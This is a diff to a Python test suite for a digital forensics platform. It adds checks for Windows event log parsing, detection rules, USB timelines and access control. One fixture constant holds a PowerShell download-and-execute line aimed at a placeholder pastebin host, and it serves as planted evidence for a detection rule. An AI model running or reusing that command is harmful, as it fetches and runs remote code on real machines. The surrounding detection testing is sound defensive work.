@@ -11,6 +11,7 @@ Usage: python dfip_full_test.py <phase>   (phases: main, desktop_writes, reg_ope
 Results: /out/results-<phase>.json
 """
 import asyncio
+import base64
 import hashlib
 import json
 import os
@@ -502,10 +503,10 @@ def t_analysis():
           and j2['result']['summary']['counts'] == counts, (counts, j2.get('result', {}).get('summary', {}).get('counts')))
 
 
-STANDARD_MODULES = ['tz_probe', 'fs_index', 'computer', 'artifacts', 'registry', 'fileproc', 'hash_match', 'yara']
+STANDARD_MODULES = ['tz_probe', 'fs_index', 'computer', 'artifacts', 'registry', 'eventlogs', 'fileproc', 'hash_match', 'yara']
 # The full profile adds archive members, file contents, unallocated space and found data.
-ALL_MODULES = ['tz_probe', 'fs_index', 'computer', 'artifacts', 'registry', 'fileproc', 'containers', 'hash_match', 'yara', 'content',
-               'unallocated', 'found_data']
+ALL_MODULES = ['tz_probe', 'fs_index', 'computer', 'artifacts', 'registry', 'eventlogs', 'fileproc', 'containers', 'hash_match', 'yara',
+               'content', 'unallocated', 'found_data']
 
 
 def _ids(db, col, q):
@@ -566,11 +567,11 @@ def t_modules():
     j = _analyse(inv, E, {'modules': ['fs_index']})
     s = j['result']['summary']
     check('re-running the file system index also refreshes the modules built on it',
-          j['status'] == 'COMPLETED' and s['plan'] == ['fs_index', 'artifacts', 'registry', 'fileproc', 'hash_match', 'yara'] and s['counts'] == C['COUNTS'], (s.get('plan'), s.get('counts')))
+          j['status'] == 'COMPLETED' and s['plan'] == ['fs_index', 'artifacts', 'registry', 'eventlogs', 'fileproc', 'hash_match', 'yara'] and s['counts'] == C['COUNTS'], (s.get('plan'), s.get('counts')))
     j = _analyse(inv, E, {'modules': ['tz_probe']})
     s = j['result']['summary']
     check('re-reading the time zone re-indexes the file system and refreshes what is built on it (not the computer module)',
-          j['status'] == 'COMPLETED' and s['plan'] == ['tz_probe', 'fs_index', 'artifacts', 'registry', 'fileproc', 'hash_match', 'yara']
+          j['status'] == 'COMPLETED' and s['plan'] == ['tz_probe', 'fs_index', 'artifacts', 'registry', 'eventlogs', 'fileproc', 'hash_match', 'yara']
           and s['counts'] == C['COUNTS'], s.get('plan'))
 
     # A broker redelivery of a finished job must not run it again.
@@ -815,8 +816,9 @@ def t_timeline():
     usb = [e for e in data if e['type'] == 'USB_ACTIVITY']
     check('SanDisk first install at 14:12:44 UTC is on the timeline',
           any(iso(e['timestamp']) == utc(2026, 9, 1, 14, 12, 44) and 'SanDisk' in e['description'] for e in usb), [e['description'] for e in usb])
-    check('USB event count equals the USB times the devices have', len(usb) == sum(
+    check('USB event count equals the USB times the devices have (registry, setupapi.dev.log and event log connects and removals)', len(usb) == sum(
         sum(1 for k in ('first_install', 'last_install', 'last_arrival', 'last_removal', 'setupapi_first_install') if d.get(k))
+        + sum(1 for x in d.get('eventlog_events') or [] if x['action'] in ('connected', 'removed', 'driver installed'))
         for d in get(f'/api/forensics/usb?case_id={A}', inv).json['data']), len(usb))
     tv = get(f'/api/forensics/timeline?case_id={A}&type=BROWSER_VISIT', inv).json
     check('type filter (6 browser visits)', tv['total'] == 6 and all(e['type'] == 'BROWSER_VISIT' for e in tv['data']), tv['total'])
@@ -1097,7 +1099,7 @@ def t_computer():
     after = db.fs_entries.find_one({'evidence_id': E, 'path': '/Users/alice/Documents/payroll-export.csv'})
     tz = get(f'/api/evidence/{E}', inv).json.get('time_zone') or {}
     check('setting the time zone re-indexes with it (FAT times as recorded: 05:41:02 = local time read as UTC)',
-          j.get('status') == 'COMPLETED' and j['result']['summary']['plan'] == ['tz_probe', 'fs_index', 'artifacts', 'registry', 'fileproc', 'hash_match', 'yara']
+          j.get('status') == 'COMPLETED' and j['result']['summary']['plan'] == ['tz_probe', 'fs_index', 'artifacts', 'registry', 'eventlogs', 'fileproc', 'hash_match', 'yara']
           and after['mtime'] == utc(2026, 9, 1, 5, 41, 2) and tz.get('source') == 'override' and tz.get('zone') == 'UTC', (j.get('status'), after.get('mtime'), tz.get('source')))
     check('...and tags still follow their items after the times changed', j.get('result', {}).get('summary', {}).get('tags') == {'relinked': 2, 'unresolved': 0},
           j.get('result', {}).get('summary', {}).get('tags'))
@@ -1490,6 +1492,9 @@ def t_content():
     check('IP addresses include the planted one and the interface in the SYSTEM hive, not its netmask',
           {'10.20.30.40', '192.168.1.57'} <= ips and '255.255.255.0' not in ips, ips)
     history = {u for _, u, *_ in CHROME_VISITS} | {'https://tools.example.org/securedelete'}  # visits and the download's page
+    # Security.evtx holds the namespace of event 1102's UserData as text, which the strings of the log expose. (The event
+    # namespace is there too, but it follows a length byte that reads as "5", so it is not a separate word.)
+    history.add('http://manifests.microsoft.com/win/2004/08/windows/eventlog')
     urls = set(by_kind.get('url', {}))
     check('web addresses are exactly the URLs of the browser history and the contacts file, each whole (database values read apart)',
           urls == history, (sorted(urls - history), sorted(history - urls)))
@@ -1838,6 +1843,283 @@ def csv_rows(text):
     import csv
     import io
     return list(csv.reader(io.StringIO(text)))
+
+
+LOGS_DIR = '/Windows/System32/winevt/Logs'
+EVTX_LOGS = {  # log file -> (channel, records written by make_artifacts.py)
+    'Security.evtx': ('Security', 9), 'System.evtx': ('System', 7),
+    'Microsoft-Windows-PowerShell%4Operational.evtx': ('Microsoft-Windows-PowerShell/Operational', 1),
+    'Windows PowerShell.evtx': ('Windows PowerShell', 2),
+    'Microsoft-Windows-Partition%4Diagnostic.evtx': ('Microsoft-Windows-Partition/Diagnostic', 2),
+}
+PS_SCRIPT = 'IEX (New-Object Net.WebClient).DownloadString("https://pastebin.example.com/raw/x9f2")'  # make_artifacts.py
+EXPECTED_DETECTIONS = {  # rule title -> (event ID, time) of the one record it must match
+    'Service installed from a user or temporary folder, or running a script': (7045, utc(2026, 9, 1, 10, 7, 30)),
+    'PowerShell started with an encoded command': (400, utc(2026, 9, 1, 14, 24, 30)),
+    'PowerShell downloads and runs code': (4104, utc(2026, 9, 1, 14, 24, 31)),
+    'Security event log cleared': (1102, utc(2026, 9, 1, 14, 25)),
+    'Local user account created': (4720, utc(2026, 9, 1, 15, 10, 5)),
+    'Account added to the Administrators group': (4732, utc(2026, 9, 1, 15, 10, 20)),
+    'Local user account deleted': (4726, utc(2026, 9, 1, 18, 30)),
+}
+
+
+def _evtx_truth(data: bytes):
+    """python-evtx, an independent EVTX reader, on a log's bytes: {record number: fields}."""
+    import defusedxml.ElementTree as ET
+    from Evtx.Evtx import Evtx
+    tag = lambda e: e.tag.rsplit('}', 1)[-1]
+    p = Path(tempfile.mkdtemp()) / 'log.evtx'
+    p.write_bytes(data)
+    out = {}
+    with Evtx(str(p)) as log:
+        for r in log.records():
+            raw = r.xml()
+            root = ET.fromstring(raw)
+            rec = {'record_id': r.record_num(), 'data': {}, 'values': [], 'user_data': None, 'arrays': '&lt;string&gt;' in raw}
+            for part in root:
+                if tag(part) == 'System':
+                    for el in part:
+                        t = tag(el)
+                        if t == 'EventID':
+                            rec['event_id'] = int(el.text)
+                        elif t == 'TimeCreated':
+                            rec['time'] = iso(el.get('SystemTime'))
+                        elif t == 'Provider':
+                            rec['provider'] = el.get('Name')
+                        elif t in ('Channel', 'Computer'):
+                            rec[t.lower()] = el.text
+                        elif t == 'Security':
+                            rec['user_sid'] = el.get('UserID') or None
+                elif tag(part) == 'EventData':
+                    for d in part:
+                        if tag(d) == 'Binary':
+                            rec['data']['Binary'] = d.text or ''
+                        elif d.get('Name') is not None:
+                            rec['data'][d.get('Name')] = d.text or ''
+                        else:
+                            rec['values'].append(d.text or '')
+                elif tag(part) == 'UserData' and len(part):
+                    rec['user_data'] = tag(part[0])
+                    rec['data'].update({tag(c): (c.text or '').strip() for c in part[0] if not len(c)})
+            out[rec['record_id']] = rec
+    return out
+
+
+_EVTX_TIME = re.compile(r'(\d{4}-\d\d-\d\d)[T ](\d\d:\d\d:\d\d)(?:\.(\d+))?(?:Z|\+00:00)?$')
+
+
+def _evtx_same(ours, theirs):
+    """One data value as libevtx (ours) and python-evtx print it: FILETIMEs as text with nanoseconds or through floating
+    point, binary as hex or Base64, GUIDs and booleans in another case, control characters kept or dropped."""
+    a = re.sub(r'[\x00-\x1f]', '', '' if ours is None else str(ours)).strip()
+    b = re.sub(r'[\x00-\x1f]', '', '' if theirs is None else str(theirs)).strip()
+    if a.casefold() == b.casefold():
+        return True
+    ta, tb = _EVTX_TIME.match(a), _EVTX_TIME.match(b)
+    if ta and tb:
+        t = lambda m: datetime.fromisoformat(f'{m.group(1)}T{m.group(2)}.{(m.group(3) or "0")[:6].ljust(6, "0")}')
+        return abs(t(ta) - t(tb)) <= timedelta(microseconds=2)
+    if a and b and re.fullmatch(r'[0-9A-Fa-f]+', a):
+        try:
+            return base64.b64decode(b, validate=True).hex().casefold() == a.casefold()
+        except Exception:
+            return False
+    return False
+
+
+def _evtx_equal(ours: dict, theirs: dict) -> bool:
+    """A record's data as both readers give it. python-evtx prints a NULL value as an empty element where libevtx (and
+    Windows) leaves it out, and prints string arrays as markup; empty values are ignored and arrays compared by content."""
+    blank = lambda v: v is None or not re.sub(r'[\x00-\x1f]', '', str(v)).strip()  # python-evtx drops control characters
+    od = {k: v for k, v in (ours.get('data') or {}).items() if not blank(v)}
+    td = {k: v for k, v in theirs['data'].items() if not blank(v)}
+    if set(od) != set(td) or not all(_evtx_same(od[k], td[k]) for k in od):
+        return False
+    ov = [v for v in ours.get('data_values') or [] if not blank(v)]
+    tv = [v for v in theirs['values'] if not blank(v)]
+    if theirs['arrays']:
+        joined = ' '.join(tv)
+        return all(re.sub(r'[\x00-\x1f]', '', v) in joined for v in ov)
+    return len(ov) == len(tv) and all(_evtx_same(a, b) for a, b in zip(ov, tv))
+
+
+@section('12h Windows event logs (vs python-evtx on the logs in the image, and the generator)')
+def t_eventlogs():
+    inv, A, E = C['INVESTIGATOR'], C['A'], C['E']
+    mods = get(f'/api/evidence/{E}', inv).json['modules']
+    check('the event log module ran with the standard analysis', (mods.get('eventlogs') or {}).get('status') == 'COMPLETED', mods.get('eventlogs'))
+    logs = {x['name']: x for x in get(f'/api/forensics/eventlogs/logs?case_id={A}&evidence_id={E}', inv).json['data']}
+    events = get(f'/api/forensics/eventlogs/events?case_id={A}&evidence_id={E}&limit=1000', inv).json['data']
+    by_log = {}
+    for e in events:
+        by_log.setdefault(e['log'], {})[e['record_id']] = e
+
+    # Every log, record for record, against python-evtx reading the same bytes out of the image.
+    truth = {name: _evtx_truth(icat_bytes(f'{LOGS_DIR}/{name}')) for name in EVTX_LOGS}
+    check('every log is found with its SHA-256 (as icat reads it), channel, record count and time span',
+          set(logs) == set(EVTX_LOGS) and all(
+              logs[n]['sha256'] == hashlib.sha256(icat_bytes(f'{LOGS_DIR}/{n}')).hexdigest() and logs[n]['channel'] == ch
+              and logs[n]['records'] == len(truth[n]) == count and logs[n]['recovered'] == 0
+              and iso(logs[n]['first']) == min(r['time'] for r in truth[n].values()) and iso(logs[n]['last']) == max(r['time'] for r in truth[n].values())
+              for n, (ch, count) in EVTX_LOGS.items()),
+          {n: (x.get('channel'), x.get('records'), x.get('first'), x.get('last')) for n, x in logs.items()})
+    mismatch = []
+    for name, recs in truth.items():
+        for num, t in recs.items():
+            o = by_log.get(name, {}).get(num)
+            if not o or (o['event_id'], o['provider'], o['channel'], o['computer'], o.get('user_sid')) != \
+                    (t['event_id'], t['provider'], t['channel'], t['computer'], t.get('user_sid')) \
+                    or abs(iso(o['time']) - t['time']) > timedelta(microseconds=1) or not _evtx_equal(o, t) or o.get('user_data') != t['user_data']:
+                mismatch.append((name, num, o and {k: o.get(k) for k in ('event_id', 'time', 'data', 'data_values')}, t))
+    check(f'all {sum(len(r) for r in truth.values())} records equal python-evtx: record number, event ID, provider, channel, computer, '
+          'user SID, time, EventData (named and unnamed) and UserData', not mismatch and len(events) == sum(len(r) for r in truth.values()), mismatch[:3])
+
+    # What the events mean, against the generator's story.
+    ev = {(e['event_id'], e['time']): e for e in events}
+    at = lambda eid, *t: ev.get((eid, utc(2026, 9, 1, *t).isoformat()), {})
+    expected = {
+        (1102, 14, 25, 0): ('Security log cleared by LAPTOP-07\\alice', 'alice', 'LOG_CLEARED'),
+        (4624, 14, 30, 12): ('LAPTOP-07\\alice logged on (Unlock, type 7) (workstation LAPTOP-07)', 'alice', 'LOGON'),
+        (4625, 15, 2, 10): ('Failed logon for LAPTOP-07\\administrator (Network, type 3) from 192.168.1.66 (workstation KALI): wrong password',
+                            'administrator', 'LOGON_FAILED'),
+        (4720, 15, 10, 5): ('User account created: LAPTOP-07\\backup_admin by LAPTOP-07\\alice', 'backup_admin', 'ACCOUNT'),
+        (4732, 15, 10, 20): ('backup_admin added to group Builtin\\Administrators by LAPTOP-07\\alice', 'backup_admin', 'ACCOUNT'),
+        (4726, 18, 30, 0): ('User account deleted: LAPTOP-07\\backup_admin by LAPTOP-07\\alice', 'backup_admin', 'ACCOUNT'),
+        (4647, 18, 41, 30): ('LAPTOP-07\\alice logged off (user initiated)', 'alice', 'LOGON'),
+        (7001, 8, 52, 10): ('alice logged on (Winlogon)', 'alice', 'LOGON'),
+        (7002, 12, 31, 4): ('alice logged off (Winlogon)', 'alice', 'LOGON'),
+        (7045, 10, 7, 30): ('Service installed: Secure Delete Helper: C:\\Users\\alice\\AppData\\Roaming\\sdsvc.exe (auto start, runs as LocalSystem)',
+                            'alice', 'SERVICE'),
+        (1006, 14, 12, 44): ('Disk connected: SanDisk Cruzer Blade, 15.9 GB (serial 4C530001230518109141)', None, 'DEVICE'),
+        (1006, 14, 41, 10): ('Disk removed: SanDisk Cruzer Blade (serial 4C530001230518109141)', None, 'DEVICE'),
+        (6006, 18, 42, 5): ('Event log service stopped (clean shutdown)', None, 'POWER'),
+    }
+    got = {k: (at(k[0], *k[1:]).get('description'), at(k[0], *k[1:]).get('user'), at(k[0], *k[1:]).get('category')) for k in expected}
+    check('catalogued events are described in plain English with their user and category (backup_admin is named from the event '
+          'that created it: the account is gone from the SAM)', got == expected, {k: v for k, v in got.items() if v != expected[k]})
+    ps = at(400, 14, 24, 30)
+    check('the encoded PowerShell command is decoded, and equals the script block PowerShell logged one second later',
+          (ps.get('details') or {}).get('DecodedCommand') == PS_SCRIPT == at(4104, 14, 24, 31).get('data', {}).get('ScriptBlockText')
+          and PS_SCRIPT in ps.get('description', ''), ps.get('details'))
+    svc = next((p for p in get(f'/api/forensics/registry?case_id={A}&type=PERSISTENCE', inv).json['data'] if p['name'] == 'SecureDeleteSvc'), {})
+    check('the installed service (System 7045) is the SecureDeleteSvc service in the SYSTEM hive: same program, installed when the key was written',
+          at(7045, 10, 7, 30).get('data', {}).get('ImagePath') == svc.get('command') and iso(svc.get('key_last_write')) == utc(2026, 9, 1, 10, 7, 30), svc)
+    notable = get(f'/api/forensics/eventlogs/events?case_id={A}&evidence_id={E}&notable=true&limit=1000', inv).json
+    check('20 of the 21 records are notable (the PowerShell "engine stopped" event is not)',
+          notable['total'] == 20 and len(events) == 21 and [e['event_id'] for e in events if not e['notable']] == [403], [e['event_id'] for e in events if not e['notable']])
+
+    # Detections.
+    dets = get(f'/api/forensics/eventlogs/detections?case_id={A}&evidence_id={E}', inv).json['data']
+    by_title = {d['title']: d for d in dets}
+    rec_of = {e['nk']: e for e in events}
+    check('the curated rules detect exactly the planted activity, each on its one event',
+          set(by_title) == set(EXPECTED_DETECTIONS) and all(
+              by_title[t]['count'] == 1 and len(by_title[t]['record_nks']) == 1 and (rec_of[by_title[t]['record_nks'][0]]['event_id'],
+                                                                                     iso(rec_of[by_title[t]['record_nks'][0]]['time'])) == want
+              for t, want in EXPECTED_DETECTIONS.items()),
+          sorted((d['title'], d['count']) for d in dets))
+    check('three failed logons from 192.168.1.66 stay below the password-guessing threshold (more than 10 in 10 minutes): no detection',
+          not any('password' in d['title'].lower() for d in dets) and sum(1 for e in events if e['event_id'] == 4625) == 3, [d['title'] for d in dets])
+    check('detections are ordered most severe first, and the matched records carry the rule',
+          [d['level'] for d in dets] == sorted([d['level'] for d in dets], key=['critical', 'high', 'medium', 'low', 'informational'].index)
+          and all(by_title[t]['rule_id'] in rec_of[by_title[t]['record_nks'][0]]['detections'] for t in by_title), [d['level'] for d in dets])
+    flt = get(f"/api/forensics/eventlogs/events?case_id={A}&detection={by_title['Security event log cleared']['rule_id']}", inv).json
+    check('events can be listed by the detection that matched them', [e['event_id'] for e in flt['data']] == [1102], flt.get('total'))
+
+    # USB: the SanDisk drive gains its connect and remove times from Partition/Diagnostic 1006.
+    usb = [d for d in get(f'/api/forensics/usb?case_id={A}', inv).json['data'] if d['evidence_id'] == E]
+    sandisk = next((d for d in usb if d.get('serial') == '4C530001230518109141'), {})
+    check('the SanDisk drive (known from setupapi.dev.log) gains connected 14:12:44 and removed 14:41:10 from the event log; no device is added',
+          iso(sandisk.get('eventlog_first_connected')) == utc(2026, 9, 1, 14, 12, 44) == iso(sandisk.get('eventlog_last_connected'))
+          and iso(sandisk.get('eventlog_last_removed')) == utc(2026, 9, 1, 14, 41, 10) and sandisk.get('setupapi_first_install')
+          and [x['action'] for x in sandisk.get('eventlog_events') or []] == ['connected', 'removed']
+          and not any(d.get('source') == 'EVENT_LOG' for d in usb), sandisk)
+    tl = get(f'/api/forensics/timeline?case_id={A}&type=USB_ACTIVITY&limit=500', inv).json['data']
+    from_logs = [e for e in tl if e.get('source') == 'EVENT_LOG' and e.get('evidence_id') == E]
+    check('the timeline gains the two USB events from the event log, with the serial number',
+          sorted((e['usb_event'], iso(e['timestamp'])) for e in from_logs) == [('EVENTLOG_CONNECTED', utc(2026, 9, 1, 14, 12, 44)),
+                                                                            ('EVENTLOG_REMOVED', utc(2026, 9, 1, 14, 41, 10))]
+          and all(e['serial'] == '4C530001230518109141' for e in from_logs), from_logs)
+
+    # Timeline, dashboard and filters.
+    kinds = {}
+    for e in get(f'/api/forensics/timeline?case_id={A}&limit=2000', inv).json['data']:
+        if e.get('source') == 'EVENT_LOG' and e.get('evidence_id') == E:
+            kinds.setdefault(e['type'], []).append(iso(e['timestamp']))
+    check('notable events are on the timeline: logons (8:52, 13:28, 14:30), logoffs, the cleared log, the service and PowerShell',
+          sorted(kinds.get('LOGON', [])) == [utc(2026, 9, 1, 8, 52, 10), utc(2026, 9, 1, 13, 28, 41), utc(2026, 9, 1, 14, 30, 12)]
+          and sorted(kinds.get('LOGOFF', [])) == [utc(2026, 9, 1, 12, 31, 4), utc(2026, 9, 1, 18, 41, 30)]
+          and kinds.get('LOG_CLEARED') == [utc(2026, 9, 1, 14, 25)] and kinds.get('SERVICE_INSTALLED') == [utc(2026, 9, 1, 10, 7, 30)]
+          and len(kinds.get('POWERSHELL', [])) == 2 and len(kinds.get('LOGON_FAILED', [])) == 3 and len(kinds.get('ACCOUNT_CHANGED', [])) == 3, kinds)
+    dash = get(f'/api/cases/{A}/dashboard?tz=UTC&evidence_id={E}', inv).json
+    day = next((d for d in dash['per_day'] if d['date'] == '2026-09-01'), {})
+    check('the activity dashboard counts the 5 logons and logoffs of 1 September', (day.get('by_group') or {}).get('logon') == 5, day)
+    q = lambda extra: get(f'/api/forensics/eventlogs/events?case_id={A}&evidence_id={E}{extra}', inv)
+    check('filters: event IDs, category, search, level, user and time window',
+          q('&event_id=4625').json['total'] == 3 and q('&event_id=4624,4647').json['total'] == 2 and q('&category=ACCOUNT').json['total'] == 3
+          and q('&search=backup_admin').json['total'] == 3 and [e['event_id'] for e in q('&level=warning').json['data']] == [4104]
+          and q('&user=ALICE').json['total'] >= 8 and q('&start=2026-09-01T15:00:00Z&end=2026-09-01T15:11:00Z').json['total'] == 5,
+          [q(x).json.get('total') for x in ('&event_id=4625', '&category=ACCOUNT', '&search=backup_admin', '&user=ALICE')])
+    check('bad filters are refused (400)', q('&event_id=x').status == 400 and q('&category=NOPE').status == 400 and q('&level=loud').status == 400
+          and q('&start=yesterday').status == 400)
+    detail = get(f"/api/forensics/eventlogs/events/{at(1102, 14, 25, 0)['_id']}?case_id={A}", inv).json
+    check('one event with its XML: the 1102 record as libevtx rendered it (UserData names who cleared the log)',
+          '<EventID>1102</EventID>' in detail.get('xml', '') and '<SubjectUserName>alice</SubjectUserName>' in detail['xml']
+          and detail.get('user_data') == 'LogFileCleared', detail.get('xml', '')[:200])
+    facets = get(f'/api/forensics/eventlogs/facets?case_id={A}&evidence_id={E}', inv).json
+    check('the filter lists hold every channel and category with counts',
+          {c['value']: c['count'] for c in facets['channels']} == {ch: n for ch, n in EVTX_LOGS.values()}
+          and {c['value'] for c in facets['categories']} >= {'LOGON', 'LOGON_FAILED', 'ACCOUNT', 'LOG_CLEARED', 'SERVICE', 'POWERSHELL', 'DEVICE', 'POWER'},
+          facets)
+    s = get(f'/api/forensics/search?case_id={A}&q=backup_admin', inv).json
+    check('keyword search finds event records', (s['totals'].get('eventlogs') or 0) == 3 and 'xml' not in (s['results']['eventlogs'] or [{}])[0], s['totals'])
+    ov = get(f'/api/cases/{A}/overview', inv).json['counts']
+    case_wide = (get(f'/api/forensics/eventlogs/events?case_id={A}&limit=1', inv).json['total'],
+                 get(f'/api/forensics/eventlogs/events?case_id={A}&notable=true&limit=1', inv).json['total'],
+                 len(get(f'/api/forensics/eventlogs/detections?case_id={A}', inv).json['data']))
+    check('the overview counts event records, notable events and detections (the job summary of this image: 21, 20, 7)',
+          (ov.get('event_records'), ov.get('notable_events'), ov.get('event_detections')) == case_wide
+          and {k: C['COUNTS'].get(k) for k in ('event_records', 'notable_events', 'eventlog_detections')} == {'event_records': 21, 'notable_events': 20, 'eventlog_detections': 7},
+          (ov, case_wide, C['COUNTS']))
+    check('another investigator gets 404 for logs, events, one event and detections',
+          all(get(p, C['INV2']).status == 404 for p in (f'/api/forensics/eventlogs/logs?case_id={A}', f'/api/forensics/eventlogs/events?case_id={A}',
+                                                         f"/api/forensics/eventlogs/events/{detail['_id']}?case_id={A}",
+                                                         f'/api/forensics/eventlogs/detections?case_id={A}', f'/api/forensics/eventlogs/facets?case_id={A}')))
+
+    # Tags follow an event record through a re-run; a re-run does not duplicate anything.
+    t = post('/api/tags', inv, {'case_id': A, 'item_type': 'EVENT', 'item_id': detail['_id'], 'label': 'EVIDENCE', 'note': 'log cleared'})
+    j = _analyse(inv, E, {'modules': ['eventlogs']})
+    check('an event record can be tagged, and the tag follows it when the logs are read again',
+          t.status == 200 and j['status'] == 'COMPLETED' and j['result']['summary'].get('tags') == {'relinked': 1, 'unresolved': 0},
+          (t, j.get('result', {}).get('summary', {}).get('tags')))
+    req('DELETE', f"/api/tags/{t.json['tag_id']}", inv)
+    again = get(f'/api/forensics/eventlogs/events?case_id={A}&evidence_id={E}&limit=1000', inv).json
+    tl2 = [e for e in get(f'/api/forensics/timeline?case_id={A}&type=USB_ACTIVITY&limit=500', inv).json['data'] if e.get('source') == 'EVENT_LOG' and e.get('evidence_id') == E]
+    sandisk2 = next((d for d in get(f'/api/forensics/usb?case_id={A}', inv).json['data'] if d['evidence_id'] == E and d.get('serial') == '4C530001230518109141'), {})
+    check('reading the logs again replaces their records, detections and USB times without duplicates',
+          again['total'] == 21 and len(tl2) == 2 and len(sandisk2.get('eventlog_events') or []) == 2
+          and len(get(f'/api/forensics/eventlogs/detections?case_id={A}&evidence_id={E}', inv).json['data']) == 7, (again['total'], len(tl2)))
+
+    # Real logs: python-evtx's own sample files, read by DFIP's parser and by python-evtx.
+    sys.path.insert(0, '/app')
+    from app.forensic.eventlogs import EvtxLog
+    for name in ('security.evtx', 'system.evtx'):
+        path = sample('python-evtx', name)
+        if not path:
+            continue
+        log = EvtxLog(path, 10 ** 6)
+        ours = {r['record_id']: r for r in log.records()}
+        theirs = _evtx_truth(path.read_bytes())
+        bad = [n for n, t in theirs.items() if n not in ours or (ours[n]['event_id'], ours[n]['provider'], ours[n]['channel'], ours[n]['computer'])
+               != (t['event_id'], t['provider'], t['channel'], t['computer']) or abs(ours[n]['time'] - t['time']) > timedelta(microseconds=2)
+               or not _evtx_equal(ours[n], t)]
+        arrays = sum(1 for t in theirs.values() if t['arrays'])
+        check(f'real {name} ({len(theirs)} records): every record equals python-evtx (event ID, provider, channel, computer, time, data; '
+              f'{arrays} records with string arrays compared by content)', len(ours) == len(theirs) and not bad and not any(r.get('parse_error') for r in ours.values()),
+              (len(ours), len(theirs), bad[:5]))
+        if log.stats['unreadable']:
+            note(f'real {name}: recovered records libevtx could not read', f'{log.stats["unreadable"]} ({log.stats["errors"][0][:160]})')
 
 
 @section('13 Indicators, patterns and anomalies')
@@ -2333,7 +2615,8 @@ def t_overview():
 
 
 ACTIVITY_EVENT_TYPES = ('BROWSER_VISIT,BROWSER_DOWNLOAD,USB_ACTIVITY,PROGRAM_RUN,RECENT_FILE_OPENED,FILE_DELETED_TO_RECYCLE_BIN,'
-                        'PROGRAM_RUN_USERASSIST,PROGRAM_RUN_BAM,FOLDER_BROWSED,EXPLORER_SEARCH,TYPED_PATH,RECENT_DOC_OPENED,RUN_DIALOG,RDP_CONNECTION')
+                        'PROGRAM_RUN_USERASSIST,PROGRAM_RUN_BAM,FOLDER_BROWSED,EXPLORER_SEARCH,TYPED_PATH,RECENT_DOC_OPENED,RUN_DIALOG,RDP_CONNECTION,'
+                        'LOGON,LOGOFF')
 
 
 @section('28b Activity dashboard')
@@ -2383,7 +2666,8 @@ def t_dashboard():
 
     usb = {u['serial']: u for u in get(f'/api/forensics/usb?case_id={A}', inv).json['data']}
     spans = {s['serial']: s for s in d['usb_spans']}
-    fields = ('setupapi_first_install', 'first_install', 'last_install', 'last_arrival', 'last_removal')
+    fields = ('setupapi_first_install', 'first_install', 'last_install', 'last_arrival', 'last_removal', 'eventlog_first_connected',
+              'eventlog_last_connected', 'eventlog_last_removed')
     check('USB lanes: one per device, spanning its first and last recorded time', set(spans) == set(usb) and all(
         iso(spans[s]['first']) == min(iso(usb[s][f]) for f in fields if usb[s].get(f)) and
         iso(spans[s]['last']) == max(iso(usb[s][f]) for f in fields if usb[s].get(f)) for s in usb), spans)
@@ -2603,7 +2887,7 @@ def t_reg_disabled():
 PHASES = {
     'main': [t_platform, t_samples, t_auth, t_register, t_cases, t_rbac, t_evidence, t_analysis, t_modules, t_filesystem, t_source,
              t_recovery, t_viewer, t_timeline,
-             t_browser, t_usb, t_activity, t_computer, t_fileproc, t_content, t_containers, t_registry, t_indicators, t_carving, t_search, t_findings, t_tags, t_analyst, t_reports, t_audit, t_notifications,
+             t_browser, t_usb, t_activity, t_computer, t_fileproc, t_content, t_containers, t_registry, t_eventlogs, t_indicators, t_carving, t_search, t_findings, t_tags, t_analyst, t_reports, t_audit, t_notifications,
              t_admin, t_desktop, t_websocket, t_misc, t_e01, t_bad_images, t_cancel, t_overview, t_dashboard, t_tamper, t_audit_tamper, t_delete, t_legal_hold],
     'desktop_writes': [t_desktop_writes],
     'reg_open': [t_reg_open],
